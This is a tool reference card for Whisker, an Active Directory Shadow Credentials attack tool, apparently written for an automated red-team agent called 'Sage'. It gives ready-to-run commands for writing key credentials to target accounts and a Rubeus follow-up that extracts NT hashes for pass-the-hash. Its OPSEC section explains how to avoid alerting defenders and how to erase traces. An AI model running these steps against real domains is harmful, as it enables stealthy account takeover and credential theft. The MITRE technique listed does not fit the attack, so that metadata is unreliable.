---
name: Whisker
category: acl-abuse
subcategories: [shadow-credentials, msds-keycredentiallink]
tradecraft_tags: [shadow-credentials, adcs, pkinit, keycredentiallink, account-takeover]
mitre_attack:
  - id: T1098.004
    name: Account Manipulation — SSH Authorized Keys
source:
  url: https://github.com/eladshamir/Whisker
  license: MIT
  maintained: true
binary_type: .net-assembly
binary_filename: Whisker.exe
supported_os: [windows]
architecture: [x64, x86]
privilege_required: domain-user
network_required: true
detection_signal: |
  Whisker's core operation is a write to the msDS-KeyCredentialLink attribute of a
  target AD object. Windows Event Log ID 5136 (Directory Service Object Modification)
  captures this if DS object auditing is enabled. MDI monitors msDS-KeyCredentialLink
  writes and alerts on shadow credential attacks. LDAP write to DC is required.
usage_examples:
  - description: Add shadow credential to a user account
    args: "add /target:jon.snow"
  - description: Add shadow credential to a computer account (for RBCD or machine delegation)
    args: "add /target:WINTERFELL$"
  - description: List existing shadow credentials on an account
    args: "list /target:jon.snow"
  - description: Clear all shadow credentials from an account (cleanup)
    args: "clear /target:jon.snow"
  - description: Remove a specific shadow credential by device ID
    args: "remove /target:jon.snow /deviceid:<GUID>"
opsec_notes: |
  msDS-KeyCredentialLink writes generate Event 5136 on DCs with directory auditing
  enabled — this is a strong detection signal. MDI has dedicated detection for shadow
  credential attacks. The LDAP write is the noisy operation; the subsequent PKINIT
  authentication (Rubeus) generates normal Kerberos traffic. Always clean up (remove or
  clear) the shadow credential after use to avoid persistent forensic artifacts.
gotchas: |
  Shadow credentials require ADCS (or at least a DC configured for PKINIT with MS-PKINIT)
  to be present in the domain. If ADCS is absent, the resulting certificate cannot be used
  for Kerberos authentication. Requires GenericWrite or GenericAll over the target account,
  or WriteDACL to first grant self those rights. The added credential DeviceID (GUID) must
  be noted from Whisker output — you'll need it for the Rubeus command and for cleanup.
  Multiple shadow credentials can exist on one account; each is identified by DeviceID.
related_ttps: [rubeus, certify, standin, sharpgpoabuse]
alternatives: [pywhisker, certipy-shadow]
common_args:
  add:
    name: add
    description: Add a new shadow credential (generates key pair, writes public key to msDS-KeyCredentialLink)
    typical_values: [flag-only]
    required: true
  /target:
    description: Target AD account (user or computer$) to add the shadow credential to
    typical_values: ["jon.snow", "WINTERFELL$", "administrator"]
    required: true
  list:
    name: list
    description: List existing shadow credentials on a target account
    typical_values: [flag-only]
  clear:
    name: clear
    description: Remove ALL shadow credentials from the target account
    typical_values: [flag-only]
  remove:
    name: remove
    description: Remove a specific shadow credential by DeviceID (GUID)
    typical_values: [flag-only]
  /deviceid:
    description: DeviceID (GUID) of the specific shadow credential to remove
    typical_values: ["<GUID from whisker add output>"]
  /domain:
    description: Target domain (defaults to current)
    typical_values: [north.sevenkingdoms.local, essos.local]
  /dc:
    description: Specific DC to write to
    typical_values: ["DC01.north.sevenkingdoms.local"]
  /password:
    description: Password for the generated PFX certificate (optional)
    typical_values: ["<random>"]
last_updated: 2026-05-29
---

# Whisker

Implements the Shadow Credentials attack by writing a key credential (RSA public key)
to the `msDS-KeyCredentialLink` attribute of a target AD user or computer object.
Once written, the corresponding private key (held by the attacker) can be used with
Kerberos PKINIT to authenticate as the target account and obtain a TGT — completely
bypassing the target's password. The attack requires write access to `msDS-KeyCredentialLink`
on the target (typically GenericWrite, GenericAll, or an explicit ACL delegation).

## Typical use cases
- Silently take over a user account without changing its password (GenericWrite path)
- Take over a computer account for RBCD setup (machine account = no password change = less noise)
- Establish a persistent authentication path to an account that survives password changes
- Escalate from GenericWrite on a high-value account to DA

## How Sage uses this
Whisker appears in ACL-abuse chains identified by SharpHound. When SharpHound shows a
controlled principal with GenericWrite over a sensitive account (e.g. a kerberoastable
service account, a computer with delegation configured, or a domain admin), Sage uses
Whisker to add a shadow credential, then Rubeus PKINIT to get a TGT, then Rubeus
UnPAC-the-hash to recover the NT hash. This avoids changing the account password
(which is logged and would alert defenders) entirely.

## Output
Whisker's `add` command outputs:
- Generated DeviceID (GUID) — **save this for Rubeus command and cleanup**
- Generated certificate (PFX) as base64 — feed directly to Rubeus `/certificate:`
- Pre-formatted Rubeus command for the next step

Example Whisker add output:
```
[*] No entries for target user/computer found in msDS-KeyCredentialLink.
[*] New shadow credentials successfully added!
    DeviceID: <GUID>
    ...
[*] SPEAK WHISKER: Rubeus.exe asktgt /user:jon.snow /certificate:<base64pfx> /password:"<pw>" /domain:north.sevenkingdoms.local /dc:DC01.north.sevenkingdoms.local /getcredentials /show
```

## OPSEC considerations
The write to `msDS-KeyCredentialLink` is a privileged LDAP write that generates Event 5136
on audited DCs. MDI (Microsoft Defender for Identity) has dedicated detection for this
attribute write pattern. To minimize exposure, run Whisker, immediately follow with the
Rubeus command, and then clear the shadow credential (`Whisker clear`). Avoid leaving
shadow credentials on accounts for extended periods.

## Full Reference

> Captured against Whisker v1.0.0, 2026-05-29. Source: https://github.com/eladshamir/Whisker README.

### Sub-commands

| Sub-command | Description |
|-------------|-------------|
| `add` | Generate a key pair, add public key to msDS-KeyCredentialLink on target |
| `list` | List all entries in msDS-KeyCredentialLink on target |
| `remove` | Remove a specific entry by DeviceID |
| `clear` | Remove ALL entries from msDS-KeyCredentialLink on target |

### Full argument listing

| Arg | Description |
|-----|-------------|
| `/target:X` | Target account (sAMAccountName) — required for all commands |
| `/domain:X` | Target domain FQDN (defaults to current) |
| `/dc:X` | Specific DC FQDN |
| `/deviceid:X` | GUID for remove sub-command |
| `/password:X` | PFX password for generated certificate (random if omitted) |
| `/path:X` | Write PFX to disk at path (instead of base64 stdout) |

### Post-Whisker Rubeus command

```
Rubeus.exe asktgt /user:<target> /certificate:<base64pfx> /password:<pfxpw> \
  /domain:<domain> /dc:<dc> /getcredentials /show /nowrap
```

The `/getcredentials /show` flags perform UnPAC-the-hash — extracting the NT hash from
the PKINIT TGT's PAC without any offline cracking. The resulting NT hash can be used
for pass-the-hash via Apollo's `pth` command.

### Requirements

- Write access to `msDS-KeyCredentialLink` on the target object (GenericWrite, GenericAll, or explicit WriteProp)
- ADCS or DC PKINIT support in the domain (Windows Server 2016+ DC functional level)
- Rubeus for follow-up authentication

### Source for this reference

- https://github.com/eladshamir/Whisker (README and author blog)
- Elad Shamir blog: https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab
- Version: v1.0.0 as of 2026-05-29
